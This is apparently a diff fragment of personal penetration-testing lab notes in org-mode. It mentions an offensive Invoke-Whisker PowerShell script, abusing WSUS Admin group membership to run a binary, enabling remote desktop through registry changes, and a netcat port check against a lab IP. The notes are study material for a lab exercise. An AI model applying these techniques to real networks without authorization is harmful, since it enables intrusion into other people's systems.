+   instead.
+** invoke-whisker
+   uses the [[https://github.com/IAMinZoho/OFFSEC-PowerShell/blob/main/Invoke-Whisker.ps1][powershell script]] instead of the binary
+** the WSUS part
+   here, since we are members of the =WSUS Admin= group, we're able to just run
+   the binary and don't have to use the MITM attack.
+** check if a port/connection works with nc
+   use the =nc -zv= option; here, tries to get remote desktop working by first
+   changing the required registry values as admin and tries with nc to see if
+   we're able to connect
+   #+begin_src bat
+   nc -zv 10.129.229.239 3389
+   #+end_src
